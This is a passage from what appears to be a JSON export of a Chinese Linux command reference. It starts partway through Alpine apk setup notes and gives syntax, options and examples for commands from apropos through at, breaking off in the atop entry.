system\nrc-update add xxx # set to start on\nrc-service xxx start # equal -> /etc/init.d/xxx start\nrc-status\n\nadduser xxx\npasswd xxx\n\napk add ansible # server\nssh-keygen\n/etc/ansible/hosts\napk add python # node\nssh-copy-id\n\napk add man man-pages mdocml-apropos less less-doc\nexport PAGER=less\n/etc/rc.conf # /etc/rc.conf -> funny character\napk add bash bash-doc bash-completion # bash\napk add util-linux pciutils usbutils coreutils binutils findutils grep # grep / awk\napk add build-base gcc abuild binutils binutils-doc gcc-doc # compile\napk add cmake cmake-doc extra-cmake-modules extra-cmake-modules-doc\napk add ccache ccache-doc\n\napk add docker # docker\nrc-update add docker boot\nrc-service docker start\napk add py-pip\npip install docker-compose\nln -s /usr/bin/docker-compose /usr/bin/doc\n\n# application\napk add openssh # ssh\nrc-update add sshd\n/etc/init.d/sshd start\n/etc/sshd_config\napk add dropbear # another openssh implementation\n```","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","apk"]},{"title":"【Linux 命令】apropos","url":"/linux-command/apropos/","content":"\n在 whatis 数据库中查找字符串\n\n## 补充说明\n\n**apropos命令** 在一些特定的包含系统命令的简短描述的数据库文件里查找关键字，然后把结果送到标准输出。 \n\n如果你不知道完成某个特定任务所需要命令的名称，可以使用一个关键字通过Linux apropos实用程序来搜索它。该实用程序可以搜索关键字并且显示所有包含匹配项的man页面的简短描述。另外，使用man实用程序和-k（关键字）选项，可以得到和用Linux apropos实用程序相同的结果（实际上是相同的命令）。\n\n###  语法\n\n```shell\napropos [-dalhvV] -e|-[w|-r] [-s section] [-m system[,...]] [-M path] [-L locale] -C [file] keyword ...\n```\n\n###  选项\n\n```shell\n-d, --debug：输出调试信息。\n-v, --verbose：输出详细的警告信息。\n-r, -- regex：将每个keyword作为正则表达式解释。这是默认行为。每个keyword将匹配手册页和描述。\n-w, --wildcard：将每个keyword作为shell样式的通配符解释。\n-e, --exact：每个keyword将精确匹配手册页名字和描述。\n-a, --and：只显示匹配所有keyword的手册页和描述。默认显示匹配任何keyword的项。\n-l, --long：不根据终端宽度缩减输出。\n-s section, --section section：只查找指定的手册section。\n-m system[,...], --systems=system[,...]：用于查找其它操作系统的手册页。\n-M path, --manpath=path：指定从其它以冒号分隔的手册页层次查找。默认使用$MANPATH环境变量。这个选项覆盖$MANPATH的内容。\n-L locale, --locale=locale：apropos调用C函数setlocale来得到当前本地化信息，包括$LC_MESSAGE和$LANG。使用该选项提供一个locale字符串来临时更改本地化信息。\n-C file, --config-file=file：使用这个用户配置文件而不是默认的~/.manpath。\n-h, --help：打印帮助信息并退出。\n-V, --version：打印版本信息并退出。\n```\n\n###  返回值\n\n返回0表示成功，1表示用法、语法或配置文件错误，2表示操作错误，16表示没有找到匹配的内容。\n\n###  实例\n\n```shell\n[root@localhost ~]# man -k who\nat.allow [at]        (5)  - determine who can submit jobs via at or batch\nat.deny [at]         (5)  - determine who can submit jobs via at or batch\njwhois               (1)  - client for the whois service\njwhois              (rpm) - Internet whois/nicname client.\nNet::LDAP::Extension::whoami (3pm)  - LDAP Who am I? Operation\nw                    (1)  - Show who is logged on and what they are doing\nwho                  (1p)  - display who is on the system\nwho                  (1)  - show who is logged on\nwhoami               (1)  - print effective userid\n\n[root@localhost ~]# apropos who\nat.allow [at]        (5)  - determine who can submit jobs via at or batch\nat.deny [at]         (5)  - determine who can submit jobs via at or batch\njwhois               (1)  - client for the whois service\njwhois              (rpm) - Internet whois/nicname client.\nNet::LDAP::Extension::WhoAmI (3pm)  - LDAP Who am I? Operation\nw                    (1)  - Show who is logged on and what they are doing\nwho                  (1p)  - display who is on the system\nwho                  (1)  - show who is logged on\nwhoami               (1)  - print effective userid\n```\n\n查找手册页名字和描述中包含emacs和vi的手册页：\n\n```shell\napropos -a emacs vi\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","apropos"]},{"title":"【Linux 命令】apt-get","url":"/linux-command/apt-get/","content":"\nDebian Linux发行版中的APT软件包管理工具\n\n## 补充说明\n\n**apt-get命令** 是Debian Linux发行版中的APT软件包管理工具。所有基于Debian的发行都使用这个包管理系统。deb包可以把一个应用的文件包在一起，大体就如同Windows上的安装文件。\n\n###  语法\n\n```shell\napt-get [OPTION] PACKAGE\n```\n\n###  选项\n\n```shell\napt-get install  # 安装新包\napt-get remove   # 卸载已安装的包（保留配置文件）\napt-get purge    # 卸载已安装的包（删除配置文件）\napt-get update   # 更新软件包列表\napt-get upgrade  # 更新所有已安装的包\napt-get autoremove   # 卸载已不需要的包依赖\napt-get dist-upgrade # 自动处理依赖包升级\napt-get autoclean    # 将已经删除了的软件包的.deb安装文件从硬盘中删除掉\napt-get clean        # 删除软件包的安装包\n\n-c：指定配置文件。\n```\n\n###  参数\n\n* 管理指令：对APT软件包的管理操作；\n* 软件包：指定要操纵的软件包。\n\n###  实例\n\n使用apt-get命令的第一步就是引入必需的软件库，Debian的软件库也就是所有Debian软件包的集合，它们存在互联网上的一些公共站点上。把它们的地址加入，apt-get就能搜索到我们想要的软件。/etc/apt/sources.list是存放这些地址列表的配置文件，其格式如下：\n\n```shell\ndeb web或[ftp地址] [发行版名字] main/contrib/non-[free]\n```\n\n我们常用的Ubuntu就是一个基于Debian的发行，我们使用apt-get命令获取这个列表，以下是我整理的常用命令：\n\n在修改`/etc/apt/sources.list`或者`/etc/apt/preferences`之后运行该命令。此外您需要定期运行这一命令以确保您的软件包列表是最新的：\n\n```shell\napt-get update\n```\n\n安装一个新软件包：\n\n```shell\napt-get install packagename\n```\n\n卸载一个已安装的软件包（保留配置文件）：\n\n```shell\napt-get remove packagename\n```\n\n卸载一个已安装的软件包（删除配置文件）：\n\n```shell\napt-get –purge remove packagename\n```\n\n会把已装或已卸的软件都备份在硬盘上，所以如果需要空间的话，可以让这个命令来删除你已经删掉的软件：\n\n```shell\napt-get autoclean apt\n```\n\n这个命令会把安装的软件的备份也删除，不过这样不会影响软件的使用的：\n\n```shell\napt-get clean\n```\n\n更新所有已安装的软件包：\n\n```shell\napt-get upgrade\n```\n\n将系统升级到新版本：\n\n```shell\napt-get dist-upgrade\n```\n\n定期运行这个命令来清除那些已经卸载的软件包的.deb文件。通过这种方式，您可以释放大量的磁盘空间。如果您的需求十分迫切，可以使用`apt-get clean`以释放更多空间。这个命令会将已安装软件包裹的.deb文件一并删除。大多数情况下您不会再用到这些.debs文件，因此如果您为磁盘空间不足 而感到焦头烂额，这个办法也许值得一试：\n\n```shell\napt-get autoclean\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","apt-get"]},{"title":"【Linux 命令】apt-key","url":"/linux-command/apt-key/","content":"\n管理Debian Linux系统中的软件包密钥\n\n## 补充说明\n\n**apt-key命令** 用于管理Debian Linux系统中的软件包密钥。每个发布的deb包，都是通过密钥认证的，apt-key用来管理密钥。\n\n###  语法\n\n```shell\napt-key(参数)\n```\n\n###  参数\n\n操作指令：APT密钥操作指令。\n\n###  实例\n\n```shell\napt-key list          # 列出已保存在系统中key。\napt-key add keyname   # 把下载的key添加到本地trusted数据库中。\napt-key del keyname   # 从本地trusted数据库删除key。\napt-key update        # 更新本地trusted数据库，删除过期没用的key。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","apt-key"]},{"title":"【Linux 命令】apt-sortpkgs","url":"/linux-command/apt-sortpkgs/","content":"\nDebian Linux下对软件包索引文件进行排序的工具\n\n## 补充说明\n\n**apt-sortpkgs命令** 是Debian Linux下对软件包索引文件进行排序的简单工具。\n\n###  语法\n\n```shell\napt-sortpkgs(选项)(参数)\n```\n\n###  选项\n\n```shell\n-s：使用源索引字段排序；\n-h：显示帮助信息。\n```\n\n###  参数\n\n文件：指定要排序的包含debian包信息的索引文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","apt-sortpkgs"]},{"title":"【Linux 命令】aptitude","url":"/linux-command/aptitude/","content":"\nDebian Linux系统中软件包管理工具\n\n## 补充说明\n\n**aptitude命令** 与apt-get命令一样，都是Debian Linux及其衍生系统中功能极其强大的包管理工具。与apt-get不同的是，aptitude在处理依赖问题上更佳一些。举例来说，aptitude在删除一个包时，会同时删除本身所依赖的包。这样，系统中不会残留无用的包，整个系统更为干净。它通过文本操作菜单和命令两种方式管理软件包。\n\n###  语法\n\n```shell\naptitude(选项)(参数)\n```\n\n###  选项\n\n```shell\n-h：显示帮助信息；\n-d：仅下载软件包，不执行安装操作；\n-P：每一步操作都要求确认；\n-y：所有问题都回答“yes”；\n-v：显示附加信息；\n-u：启动时下载新的软件包列表。\n```\n\n###  参数\n\n操作命令：用户管理软件包的操作命令。\n\n###  实例\n\n以下是我总结的一些常用aptitude命令，仅供参考：\n\n```shell\naptitude update            # 更新可用的包列表\naptitude upgrade           # 升级可用的包\naptitude dist-upgrade      # 将系统升级到新的发行版\naptitude install pkgname   # 安装包\naptitude remove pkgname    # 删除包\naptitude purge pkgname     # 删除包及其配置文件\naptitude search string     # 搜索包\naptitude show pkgname      # 显示包的详细信息\naptitude clean             # 删除下载的包文件\naptitude autoclean         # 仅删除过期的包文件\n```\n\n当然，你也可以在文本界面模式中使用 aptitude。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","aptitude"]},{"title":"【Linux 命令】ar","url":"/linux-command/ar/","content":"\n建立或修改备存文件，或是从备存文件中抽取文件\n\n## 补充说明\n\n**ar命令** 是一个建立或修改备存文件，或是从备存文件中抽取文件的工具，ar可让您集合许多文件，成为单一的备存文件。在备存文件中，所有成员文件皆保有原来的属性与权限\n\n###  语法\n\n```shell\nar [-]{dmpqrtx}[abcfilNoPsSuvV] [membername] [count] archive files...\nUsage: ar [emulation options] [-]{dmpqrstx}[abcDfilMNoPsSTuvV] [--plugin <name>] [member-name] [count] archive-file file...\n       ar -M [<mri-脚本]\n```\n\n###  选项\n\n```shell\nar 允许你 在第一个 命令行 参数中 以任意 顺序 混合 指定 操作码p 和修饰符mod .\n\n只要你 愿意, 也可以 用破折号 作为 命令行 第一个 参数的 开始.\n\np 关键字 指明 要执行的 操作, 只能 指明为 如下 之一:\n\nd      从档案中删除 模块. 通过files 指明 要删除的 模块的 名称; 如果 没有 指出 要删除的  文件  名称,  档案不会  改变  任何\n      内容.\n\n      如果 给出了'v' 修饰符,ar 会例出 它删除的 每一个 模块.\n\nm      用此 操作 在档案中移动 成员.\n      如果 某个 符号名 在档案的 多个 成员中 有定义, 那么 程序 怎样 连接 档案 文件 得到的 结果 可能是 不同的.\n      如果  没有为m 指定 修饰符, 由files 指出的 成员 将移动到 档案的末尾 ; 可以 通过 `a', `b' 或 `i' 等修饰符, 指定 成员\n      移动的 具体 位置.\n\np      在标准 输出上 打印 档案中 指定的 成员.  如果 给出了`v' 修饰符, 在 打印 成员 内容 之前, 先打印 成员的 名字.\n      如果没有 指明files 参数, 档案中 所有的 成员 都会被 打印 出来.\n\nq      快速 追加; 增加 files 到 archive 的末尾, 不进行 替换 检查.\n      修饰符 `a' `b' 和 `i'不 影响此 操作, 新成员 始终 追加到 档案的 末尾处.\n      修饰符 `v' 可以使 ar 列出 它追加的 所有文件.\n      由于 本功能 是用于 快速操作, 即使 档案中 有 符号表 索引 也不 进行 更新; 可以 使用 `ar s' 或 ranlib 明确 要求  更新\n      这些索引.\n\n      在为快速 追加 重建 索引时,由于 有 太多 不同的 系统, 所以 GNU ar 采用 `q' 作为 `r'的一个 同义字.\n\nr      把文件  files  插入 archive ( 替换 ). 本操作与 `q' 是不同的, 如果 档案中 已有的 某个 成员与 插入 文件的 名称 相同,\n      此成员 将被删除.\n      如果 不存在 名称为 files 的文件, ar 显示 一个 错误 消息, 并且 保留 档案中 已有的 同名 成员.\n      缺省情况下, 新成员 增加到 挡案的 末尾; 可以 通过 使用 `a' `b' 或 `i' 等修饰符 指定 相对于 已有 成员的 位置.\n      通过 使用 `v' 修饰符 会为每个 插入的 文件 产生 一行 输出, 根据 输出中的 字符 `a' 或 `r' 可以 表明 该文件  是追加的\n      (没有 删除 以前的成员) 还是 替换的.\n\nt      显示  一个 archive 档案 所包含 内容的 列表 , 或 档案中的 由 files 指出的 文件 列表.  通常 只显示 成员的 名称, 如果\n      使用 `v' 修饰符, 可以 得到 成员的 权限, 时间属性, 属主, 组和 大小.\n\n      如果 没有 指出 files, 档案中的 所有 文件 都会 列出.\n\n      如果 档案中 (称为 `b.a') 有多个 同名 成员 (称为 `fie'), `ar t b.a fie' 仅仅 列出 第一个; 要看到 它们的 全部,  必须\n      要求 完整的 列表 —在本例中是 `ar t b.a'.\n\nx      从档案中 抽取  成员 (名称为 files) .  如果 使用 `v' 修饰符, ar 会列出 它抽取的 每一个 文件的 名字.\n      如果没有给出 files, 抽取 档案中 所有的 文件.\n\n可以在 操作符 p 后紧随 一定数量的 修饰符 mod 以指明 操作的 各种 行为.\n\na      增加 文件到 档案中 已有 成员 之后  , 如果 使用了 修饰符 a, 必须在 档案 名称 archive 之前 以 membername 参数的 形式\n      给出 档案中 已有 成员的 名字.\n\nb      增加 文件到 档案中 已有 成员 之前  , 如果 使用了 修饰符 b, 必须在 档案 名称 archive 之前 以 membername 参数的 形式\n      给出 档案中 已有 成员的 名字.  (和修饰符 `i' 相同).\n\nc      建立    档案.  指定的 档案 archive 始终 会被建立, 如果 你要求 执行的是 更新, 通过 此修饰符 建立 档案时 会给出 一个\n      警告.\n      \nf      截短 档案成员的 名字.  ar 通常 允许 任意 长度的 文件名, 但这会 导致 与某些 系统上的 ar 出现 兼容性  问题,  使用  f\n      修饰符 可以 在往档案中 追加 文件时 把名字 截短.\n\ni      插入 文件到 档案中 已有 成员 之前  , 如果 使用了 修饰符 i, 必须在 档案 名称 archive 之前 以 membername 参数的 形式\n      给出 档案中 已有 成员的 名字.  (与修饰符 `b' 相同).\n\nl      接受此修饰符, 但不起作用.\n\nN      使用 count 参数. 本修饰符 用于 在档案中 有多个 同名 成员的 情况.  删除 或抽取 档案中 给定 名字的第 count 个实例.\n\no      抽取 成员时 保留 他们 原始的  时间属性. 如果 没有 此修饰符, 文件以抽取 的时间 作为 它的时间 属性.\n\nP      匹配 档案中的 名字时 使用 完整的 路径名.  ar 不能 建立 使用 完整 路径名的 档案  (这不符合  POSIX  标准),  但其它的\n      档案  工具  能够建立, 本选项 会使 ar 在抽取 由其它 工具 建立的 档案 文件时, 使用完整的 路径名 去匹配 档案中 成员的\n      名字.\n\ns      即使 没有对 档案 进行 改变, 用本 修饰符 也可以 往档案中 写一个 目标 文件的 索引 或更新 已经 存在的  索引.   可以与\n      其它 操作 一起 使用 本修饰符, 也可以 单独使用.  对一个 档案 执行 `ar s' 与执行 `ranlib' 等价.\n\nS      不生成  档案的 符号表. 这可以 加速 建立 大的档案 文件的 过程,但这样 建立的 档案 不能被 连接器 使用, 为建立 符号表,\n      在最后 执行 `ar' 时应该 不用 `S' 修饰符, 或者 对档案 执行 一次 `ranlib' .\n\nu      通常ar r... 把所有 列出的 文件 插入到 档案中, 如果 希望 仅仅 插入比 档案中 已有 成员 更新的  文件时,  就应该  使用\n      此修饰符.   `u'  修饰符  仅允许  与 `r' (替换) 操作 一起 使用.  某些 情况下, 由于 用 `q' 操作 比较 文件的 时间属性\n      会失去 速度上的 优势, 所以 不允许 执行 `qu' 组合操作.\n\nv      使用本修饰符可以进行 冗余的 操作。附加了此修饰符时，很多操作会显示 更多的消息，如处理的文件名等。\nV      显示 ar 的版本号。\n```\n\n选项参数 \n\n```shell\n--plugin <p> - load the specified plugin\n```\n\nar：支持的目标： elf64-x86-64 elf32-i386 elf32-x86-64 a.out-i386-linux pei-i386 pei-x86-64 elf64-l1om elf64-k1om elf64-little elf64-big elf32-little elf32-big plugin srec symbolsrec verilog tekhex binary ihex\n\n### 实例\n\n打包文件\n\n```shell\n[root@localhost ~]# ls   # 显示当前目录文件   \na.c\tb.c d.c   install.log\t  qte\nanaconda-ks.cfg c.c Desktop \n\n[root@localhost ~]# ar rv one.bak a.c b.c  # 打包 a.c b.c文件 \nar: 正在创建 one.bak\na - a.c\na - b.c\n```\n\n打包多个文件\n\n```shell\n[root@localhost ~]# ar rv two.bak *.c  // 打包以.c结尾的文件  \nar: 正在创建 two.bak\na - a.c\na - b.c\na - c.c\na - d.c\n```\n\n显示打包文件的内容\n\n```shell\n[root@localhost ~]# ar t two.bak    \na.c\nb.c\nc.c\nd.c\n```\n\n删除打包文件的成员文件\n\n```shell\n[root@localhost ~]# ar d two.bak a.c b.c c.c  \n[root@localhost ~]# ar t two.bak       \nd.c\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ar"]},{"title":"【Linux 命令】arch","url":"/linux-command/arch/","content":"\n显示当前主机的硬件架构类型\n\n## 概要\n\n```shell\narch [OPTION]...\n```\n\n## 主要用途\n\n- 打印机器架构信息；`arch` 命令输出结果有：i386、i486、i586、alpha、sparc、arm、m68k、mips、ppc、i686等。\n\n## 选项\n\n```shell\n--help       显示帮助信息并退出。\n--version    显示版本信息并退出。\n```\n\n## 例子\n\n```shell\n[root@localhost ~]# arch\nx86_64\n```\n\n### 注意\n\n1. 该命令等价于 `uname -m`。\n\n2. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 arch`，`info coreutils 'arch invocation'`。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","arch"]},{"title":"【Linux 命令】arj","url":"/linux-command/arj/","content":"\n用于创建和管理.arj压缩包\n\n## 补充说明\n\n**arj命令** 是 `.arj` 格式的压缩文件的管理器，用于创建和管理 `.arj` 压缩包。\n\n###  语法\n\n```shell\narj(参数)\n```\n\n###  参数\n\n*  操作指令：对  `.arj` 压缩包执行的操作指令；\n*  压缩包名称：指定要操作的arj压缩包名称。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","arj"]},{"title":"【Linux 命令】arp","url":"/linux-command/arp/","content":"\narp 命令用于显示和修改 IP 到 MAC 转换表\n\n## 补充说明\n\n**arp 命令** 是 Address Resolution Protocol，地址解析协议，是通过解析网络层地址来找寻数据链路层地址的一个网络协议包中极其重要的网络传输协议。而该命令可以显示和修改 arp 协议解析表中的缓冲数据。\n\n这个核心协议模块实现RFC826中定义的 Address Resolution Protocol [译注：即TCP/IP的第三层到第一层的地址转换协议]，用于在直接相连的网络中换第二层硬件地址和 Ipv4 协议地址之间的转换。 用户除非想对其进行配置，否则一般不会直接操作这个模块。\n\n实际上，它提供对核心中其它协议的服务。\n\n用户进程可以使用 packet(7) 的 sockets，收到 ARP 包（译注：一译分组）。 还有一种机制是使用 netlink(7) sockets，在用户空间管理 ARP 缓存的机制。我们也可以通过 ioctl (2) 控制任意 PF_INET socket上的 ARP 表\n\nARP 模块维护一个硬件地址到协议地址映射的缓存。这个缓存有大小限制，所以不常用的和旧的记录（Entry）将被垃圾收集器清除（garbage-collected），垃圾收集器永远不能删除标为永久的记录。我们可以使用ioctls直接操纵缓冲， 并且其性状可以用下面定义的 sysctl 调节。\n\n如果在限定的时间（见下面的sysctl）内，一条现存映射没有肯定反馈时， 则认为相邻层的缓存记录失效。 为了再次向目标发送数据，ARP将首先试着询问本地arp进程 app_solicit 次，获取更新了的 MAC（介质访问控制）地址。 如果失败，并且旧的MAC地址是已知的，则发送 ucast_solicit 次的 unicast probe。如果仍然失败，则将向网络广播一个新的ARP请求,此时要 有待发送数据的队列\n\n如果 Linux 接到一个地址请求，而且该地址指向 Linux 转发的地址，并且接收接口打开了代理 arp 时，Linux 将自动添加一条非永久的代理 arp 记录；如果存在拒绝到目标的路由，则不添加代理 arp 记录。\n\n### 语法\n\n```shell\narp（选项）（参数）\n```\n\n### 选项\n\n```shell\n-a # 主机 ：显示 arp 缓冲区的所有条目；\n-H # 地址类型 ：指定 arp 指令使用的地址类型；\n-d # 主机 ：从 arp 缓冲区中删除指定主机的 arp 条目；\n-D # 使用指定接口的硬件地址；\n-e # 以 Linux 的显示风格显示 arp 缓冲区中的条目；\n-i # 接口 ：指定要操作 arp 缓冲区的网络接口；\n-s # 主机 MAC 地址 ：设置指定的主机的 IP 地址与 MAC 地址的静态映射；\n-n # 以数字方式显示 arp 缓冲区中的条目；\n-v # 显示详细的 arp 缓冲区条目，包括缓冲区条目的统计信息；\n-f # 文件 ：设置主机的 IP 地址与 MAC 地址的静态映射。\n```\n\n### 参数\n\n主机：查询 arp 缓冲区中指定主机的 arp 条目。\n\n### 实例\n\n显示arp 缓冲区内容\n\n```shell\n[root@localhost ~]# arp -v\nAddress                  HWtype  HWaddress           Flags Mask            Iface\n192.168.0.134            ether   00:21:5E:C7:4D:88   C                     eth1\n115.238.144.129          ether   38:22:D6:2F:B2:F1   C                     eth0\nEntries: 2      Skipped: 0      Found: 2\n```\n\n添加静态 arp 映射\n\n```shell\narp -s IP MAC-ADDRESS\narp -s 192.168.1.1 00:b1:b2:b3:b4:b5\n```\n\n删除 arp 缓存条目\n\n```shell\narp -d 192.168.1.1\n```\n\n<!-- Linux 命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","arp"]},{"title":"【Linux 命令】arpd","url":"/linux-command/arpd/","content":"\n收集免费ARP信息\n\n## 补充说明\n\n**arpd命令** 是用来收集免费arp信息的一个守护进程，它将收集到的信息保存在磁盘上或者在需要时，提供给内核用户用于避免多余广播。\n\n###  语法\n\n```shell\narpd(选项)(参数)\n```\n\n###  选项\n\n```shell\n-l：将arp数据库输出到标准输出设备显示并退出；\n-f：指定读取和加载arpd数据库的文本文件，文件的格式与“-l”输出信息类似；\n-b：指定arpd数据库文件，默认的位置为“/var/lib/arpd.db”；\n-a：指定目标被认为死掉前查询的次数；\n-k：禁止通过内核发送广播查询；\n-n：设定缓冲失效时间。\n```\n\n###  参数\n\n网络接口：指定网络接口。\n\n###  实例\n\n启动arpd进程：\n\n```shell\narpd -b /var/tmp/arpd.db\n```\n\n运行一段时间后，查看结果：\n\n```shell\narpd -l -b /var/tmp/arpd.db\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","arpd"]},{"title":"【Linux 命令】arping","url":"/linux-command/arping/","content":"\n通过发送ARP协议报文测试网络\n\n## 补充说明\n\n**arping命令** 是用于发送arp请求到一个相邻主机的工具，arping使用arp数据包，通过ping命令检查设备上的硬件地址。能够测试一个ip地址是否是在网络上已经被使用，并能够获取更多设备信息。功能类似于ping。\n\n###  语法\n\n```shell\narping(选项)(参数)\n```\n\n###  选项\n\n```shell\n-b：用于发送以太网广播帧（FFFFFFFFFFFF）。arping一开始使用广播地址，在收到响应后就使用unicast地址。\n-q：quiet output不显示任何信息；\n-f：表示在收到第一个响应报文后就退出；\n-w timeout：设定一个超时时间，单位是秒。如果到了指定时间，arping还没到完全收到响应则退出；\n-c count：表示发送指定数量的ARP请求数据包后就停止。如果指定了deadline选项，则arping会等待相同数量的arp响应包，直到超时为止；\n-s source：设定arping发送的arp数据包中的SPA字段的值。如果为空，则按下面处理，如果是DAD模式（冲突地址探测），则设置为0.0.0.0，如果是Unsolicited ARP模式（Gratutious ARP）则设置为目标地址，否则从路由表得出；\n-I interface：设置ping使用的网络接口。\n```\n\n###  参数\n\n目的主机：指定发送ARP报文的目的主机。\n\n###  实例\n\n```shell\n[root@localhost ~]# arping www.baidu.com \nARPING 220.181.111.147 from 173.231.43.132 eth0\nUnicast reply from 220.181.111.147 00:D0:03:[bc:48:00]  1.666ms\nUnicast reply from 220.181.111.147 [00:D0:03:BC:48:00]  1.677ms\nUnicast reply from 220.181.111.147 [00:D0:03:BC:48:00]  1.691ms\nUnicast reply from 220.181.111.147 [00:D0:03:BC:48:00]  1.728ms\nUnicast reply from 220.181.111.147 [00:D0:03:BC:48:00]  1.626ms\nUnicast reply from 220.181.111.147 [00:D0:03:BC:48:00]  1.292ms\nUnicast reply from 220.181.111.147 [00:D0:03:BC:48:00]  1.429ms\nUnicast reply from 220.181.111.147 [00:D0:03:BC:48:00]  2.042ms\nSent 8 probes (1 broadcast(s))\nReceived 8 response(s)\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","arping"]},{"title":"【Linux 命令】arptables","url":"/linux-command/arptables/","content":"\n管理ARP包过滤规则表\n\n## 补充说明\n\n**arptables命令** 用来设置、维护和检查Linux内核中的arp包过滤规则表。\n\n###  语法\n\n```shell\narptables(选项)\n```\n\n###  选项\n\n```shell\n-A：向规则链中追加规则；\n-D：从指定的链中删除规则；\n-l：向规则链中插入一条新的规则；\n-R：替换指定规则；\n-P：设置规则链的默认策略；\n-F：刷新指定规则链，将其中的所有规则链删除，但是不改变规则链的默认策略；\n-Z：将规则链计数器清零；\n-L：显示规则链中的规则列表；\n-X：删除指定的空用户自定义规则链；\n-h：显示指令帮助信息；\n-j：指定满足规则的添加时的目标；\n-s：指定要匹配ARP包的源ip地址；\n-d：指定要匹配ARP包的目的IP地址。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","arptables"]},{"title":"【Linux 命令】arpwatch","url":"/linux-command/arpwatch/","content":"\n监听网络上ARP的记录\n\n## 补充说明\n\n**arpwatch命令** 用来监听网络上arp的记录。\n\n###  语法\n\n```shell\narpwatch(选项)\n```\n\n###  选项\n\n```shell\n-d：启动排错模式；\n-f<记录文件>：设置存储ARP记录的文件，预设为/var/arpwatch/arp.dat；\n-i<接口>：指定监听ARP的接口，预设的接口为eth0；\n-r<记录文件>：从指定的文件中读取ARP记录，而不是从网络上监听。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","arpwatch"]},{"title":"【Linux 命令】as","url":"/linux-command/as/","content":"\n汇编语言编译器\n\n## 补充说明\n\n**as命令** GNU组织推出的一款汇编语言编译器，它支持多种不同类型的处理器。\n\n###  语法\n\n```shell\nas(选项)(参数)\n```\n\n###  选项\n\n```shell\n-ac：忽略失败条件；\n-ad：忽略调试指令；\n-ah：包括高级源；\n-al：包括装配；\n-am：包括宏扩展；\n-an：忽略形式处理；\n-as：包括符号；\n=file：设置列出文件的名字；\n--alternate：以交互宏模式开始；\n-f：跳过空白和注释预处理；\n-g：产生调试信息；\n-J：对于有符号溢出不显示警告信息；\n-L：在符号表中保留本地符号；\n-o：指定要生成的目标文件；\n--statistics：打印汇编所用的最大空间和总时间。\n```\n\n###  参数\n\n汇编文件：指定要汇编的源文件。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","as"]},{"title":"【Linux 命令】at","url":"/linux-command/at/","content":"\n在指定时间执行一个任务\n\n## 补充说明\n\n**at命令** 用于在指定时间执行命令。at允许使用一套相当复杂的指定时间的方法。它能够接受在当天的hh:mm（小时:分钟）式的时间指定。假如该时间已过去，那么就放在第二天执行。当然也能够使用midnight（深夜），noon（中午），teatime（饮茶时间，一般是下午4点）等比较模糊的 词语来指定时间。用户还能够采用12小时计时制，即在时间后面加上AM（上午）或PM（下午）来说明是上午还是下午。 也能够指定命令执行的具体日期，指定格式为month day（月 日）或mm/dd/yy（月/日/年）或dd.mm.yy（日.月.年）。指定的日期必须跟在指定时间的后面。\n\n上面介绍的都是绝对计时法，其实还能够使用相对计时法，这对于安排不久就要执行的命令是很有好处的。指定格式为：`now + count time-units`，now就是当前时间，time-units是时间单位，这里能够是minutes（分钟）、hours（小时）、days（天）、weeks（星期）。count是时间的数量，究竟是几天，还是几小时，等等。 更有一种计时方法就是直接使用today（今天）、tomorrow（明天）来指定完成命令的时间。\n\n###  语法\n\n```shell\nat [-V] [-q 队列] [-f 文件] [-mldbv] 时间 at -c 作业 [作业...]\n```\n\n###  选项\n\n```shell\n-f：指定包含具体指令的任务文件；\n-q：指定新任务的队列名称；\n-l：显示待执行任务的列表；\n-d：删除指定的待执行任务；\n-m：任务执行完成后向用户发送E-mail。\n```\n\n###  参数\n\n日期时间：指定任务执行的日期时间。\n\n###  实例\n\n三天后的下午 5 点锺执行`/bin/ls`：\n\n```shell\n[root@localhost ~]# at 5pm+3 days\nat> /bin/ls\nat> <EOT>\njob 7 at 2013-01-08 17:00\n```\n\n明天17点钟，输出时间到指定文件内：\n\n```shell\n[root@localhost ~]# at 17:20 tomorrow\nat> date >/root/2013.log\nat> <EOT>\njob 8 at 2013-01-06 17:20\n```\n\n计划任务设定后，在没有执行之前我们可以用atq命令来查看系统没有执行工作任务：\n\n```shell\n[root@localhost ~]# atq\n8       2013-01-06 17:20 a root\n7       2013-01-08 17:00 a root\n```\n\n删除已经设置的任务：\n\n```shell\n[root@localhost ~]# atq\n8       2013-01-06 17:20 a root\n7       2013-01-08 17:00 a root\n\n[root@localhost ~]# atrm 7\n[root@localhost ~]# atq\n8       2013-01-06 17:20 a root\n```\n\n显示已经设置的任务内容：\n\n```shell\n[root@localhost ~]# at -c 8\n#!/bin/sh\n# atrun uid=0 gid=0\n# mail     root 0\numask 22此处省略n个字符\ndate >/root/2013.log\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","at"]},{"title":"【Linux 命令】atop","url":"/linux-command/atop/","content":"\n监控Linux系统资源与进程的工具\n\n## 补充说明\n\n[非内部程序，需要安装]它以一定的频率记录系统的运行状态，所采集的数据包含系统资源(CPU、内存、磁盘和网络)使用情况和进程运行情况，并能以日志文件的方式保存在磁盘中，服务器出现问题后，我们可获取相应的atop日志文件进行分析。atop是一款开源软件，我们可以从这里获得其源码和rpm安装包。\n\n## 语法  \n\n```shell\natop(选项)(参数)\n```\n\n## 说明  \n\n**ATOP列**：该列显示了主机名、信息采样日期和时间点\n\n**PRC列**：该列显示进程整体运行情况\n\n- sys、usr字段分别指示进程在内核态和用户态的运行时间\n- 